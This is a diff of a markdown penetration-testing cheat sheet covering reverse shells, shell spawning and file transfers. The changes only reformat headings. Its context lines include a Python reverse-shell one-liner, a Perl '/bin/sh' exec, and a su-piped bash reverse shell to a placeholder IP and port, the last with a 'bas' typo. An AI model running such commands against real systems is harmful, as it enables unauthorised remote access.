@@ -1,4 +1,6 @@
-# common go-tos
+# common actions
+
+**table of contents**:
 
 - [shells](#shells)
   * [reverse shells](#reverse-shells)
@@ -25,10 +27,10 @@
     + [directories](#SENDING-WHOLE-DIRECTORIES)
 
 ---
-## shells
----
-### reverse shells
----
+
+# shells
+
+## reverse shells
 
 ### netcat
 
@@ -64,11 +66,8 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 ### msfvenom
 
-
-
 ----
-### spawning shells
-----
+## spawning shells
 
 #### **python**
 
@@ -112,7 +111,7 @@ perl -e 'exec "/bin/sh";'
 ```
 
 ----
-### making them fully interactive
+## making them fully interactive
 ----
 
 when getting a reverse shell through `netcat`, by default it's non-interactive - meaning it's a pain. once you run any of the above scripts to get a partially interactive shell, you can do a few more things to optimize:
@@ -172,8 +171,8 @@ echo "[PASSWORD]" | su - [USER] -c "bas -i >& /dev/tcp/[LOCAL IP]/[PORT] 0>&1"
 ```
 
 ---
+
 ## file transfers
----
 
 ### wget
 
